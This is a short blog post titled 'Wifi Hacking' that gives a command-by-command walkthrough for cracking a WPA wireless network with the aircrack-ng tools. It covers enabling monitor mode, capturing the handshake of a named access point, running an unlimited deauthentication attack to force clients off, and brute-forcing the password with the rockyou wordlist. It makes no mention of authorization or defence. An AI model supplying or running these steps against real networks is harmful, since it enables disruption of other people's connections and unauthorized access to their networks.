---
layout: post
title: Wifi Hacking
---

*Alfa-card is mandatory to search/scan for available Networks*
Steps:
**Connect alfa-card and check the Interfaces**
  Run - ipconfig/iwconfig - after this you will get the wlan0 interface

**Start Monitor Mode**
	Run - airmon-ng start wlan0

**Verify its Monitor Mode**
  Run - airmon-ng/iwconfig

**Now Scan/Check for Nearby Available Networks**
  Run - airodump-ng wlan0mon
The above command this will display or show list of available networks and make sure you capture and keep a note of AP's MAC address(BSSID) and channel
*AccessPoint(AP)*

After getting BSSID and Channel id
Start Capturing the Handshake and Attack the same Time or after 5min.

	Run - airodump-ng -w test -c 11 --bssid BE:A5:8B:65:F8:FE wlan0mon - to capture the Handshake

	aireplay-ng --deauth 0 -a BE:A5:8B:65:F8:FE wlan0mon - to attack the network

	-w to save a file 

	Now Stop the Monitormode and brute force the captured handshake

	Run - airmon-ng stop wlan0mon

	Bruteforce the saved file with the wordlists to crack the password

	aircrack-ng test.cap -w /usr/share/wordlists/rockyou.txt 
